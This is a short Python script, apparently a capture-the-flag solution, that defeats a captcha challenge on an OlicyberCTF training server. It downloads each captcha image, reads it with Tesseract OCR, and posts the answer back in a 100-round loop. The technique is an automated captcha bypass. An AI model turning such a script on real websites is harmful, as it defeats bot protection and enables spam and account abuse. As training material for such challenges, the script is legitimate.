from PIL import Image
import pytesseract
import numpy as np
import requests
import time
i2=0
r=requests.get("http://captcha.challs.olicyber.it")
cookie=r.cookies
while i2<100:
    body=r.text
    for i in body.split("\n"):
        if "images" in i:
            line=i
            print(line)
    line=line[:-18]
    line=line[16:]
    #print(line)
    r2=requests.get("http://captcha.challs.olicyber.it"+line)
    with open("ciao.png", 'wb') as file:
        file.write(r2.content)
    img=np.array(Image.open('/home/rmchannel/ciao.png'))
    text=(pytesseract.image_to_string(img))
    text=text[:-2]
    # print(text)
    response={'risposta':text}
    print(response)
    r=requests.post("http://captcha.challs.olicyber.it/next",cookies=cookie, data=response)
    cookie=r.cookies
    i2+=1
    body=r.text
    for i in body.split("\n"):
        if "hai passato" in i:
            line=i
            print(line)
    print(line)
print(r.text)